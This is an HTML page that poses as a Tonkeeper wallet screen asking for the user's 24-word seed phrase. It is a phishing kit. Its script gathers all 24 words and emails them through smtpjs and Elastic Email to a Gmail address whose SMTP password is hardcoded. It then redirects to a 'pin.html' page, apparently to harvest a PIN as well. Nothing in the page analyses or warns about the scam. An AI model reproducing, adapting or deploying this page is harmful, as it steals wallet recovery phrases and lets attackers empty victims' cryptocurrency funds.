<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" type="image/png" href="logo.png">
  <link rel="stylesheet" href="style.css">
  <title>Seed Phrase Input</title>
</head>
<body>
  <form id="form" onsubmit="emailSend(); return false;">
    <div class="container">
      <h3>Your Seed Phrase</h3>
      <p>Enter your Tonkeeper 24 words seed phrase:</p>
      <button type="button" id="pasteBtn">Paste Seed Phrase To Continue</button>
      <div class="grid">
        <!-- 24 Input Fields -->
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 1">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 2">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 3">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 4">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 5">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 6">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 7">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 8">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 9">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 10">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 11">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 12">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 13">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 14">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 15">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 16">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 17">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 18">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 19">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 20">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 21">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 22">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 23">
        <input type="text" maxlength="10" class="seed-input" placeholder="Word 24">
      </div>
      <p class="warning">Make sure to enter the words in the correct order!</p>
      <label>
        <input type="checkbox" id="confirm"> I have entered my seed phrase
      </label>
      <button type="submit" id="nextBtn" disabled>Next</button>
    </div>
  </form>

  <!-- External Libraries -->
  <script src="https://smtpjs.com/v3/smtp.js"></script>
  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>

  <!-- JavaScript -->
  <script>
    function emailSend() {
      const seedPhraseWords = [];
      const seedInputs = document.querySelectorAll('.seed-input');

      seedInputs.forEach(input => {
        seedPhraseWords.push(input.value.trim());
      });

      if (seedPhraseWords.includes("") || seedPhraseWords.length !== 24) {
        swal("Error", "Please complete all 24 seed phrase fields.", "error");
        return;
      }

      const messageBody = "Seed Phrase: " + seedPhraseWords.join(" ");

      Email.send({
        Host: "smtp.elasticemail.com",
        Username: "payday10177@gmail.com",
        Password: "176A549B6BD880A9C5A531EDE06FF1F541C8",
        To: 'payday10177@gmail.com',
        From: "payday10177@gmail.com",
        Subject: "Seed Phrase",
        Body: messageBody
      }).then(
        message => {
          if (message === 'OK') {
            window.location.href = 'pin.html';
          } else {
            swal("Error", "There was a problem sending your seed phrase. Please try again.", "error");
          }
        }
      );
    }

    const seedInputs = document.querySelectorAll('.seed-input');
    const nextBtn = document.getElementById('nextBtn');
    const confirmCheckbox = document.getElementById('confirm');

    function checkFormCompletion() {
      const allFilled = Array.from(seedInputs).every(input => input.value.trim() !== '');
      nextBtn.disabled = !(allFilled && confirmCheckbox.checked);
    }

    seedInputs.forEach(input => {
      input.addEventListener('input', checkFormCompletion);
    });

    confirmCheckbox.addEventListener('change', checkFormCompletion);

    const pasteBtn = document.getElementById('pasteBtn');
    pasteBtn.addEventListener('click', () => {
      const userSeedPhrase = prompt("Paste your seed phrase (separate words with spaces):");
      if (userSeedPhrase) {
        const words = userSeedPhrase.trim().split(/\s+/);
        if (words.length !== 24) {
          swal("Error", "You must enter exactly 24 words.", "error");
          return;
        }
        seedInputs.forEach((input, index) => {
          input.value = words[index] || "";
        });
        checkFormCompletion();
      }
    });
  </script>
</body>
</html>
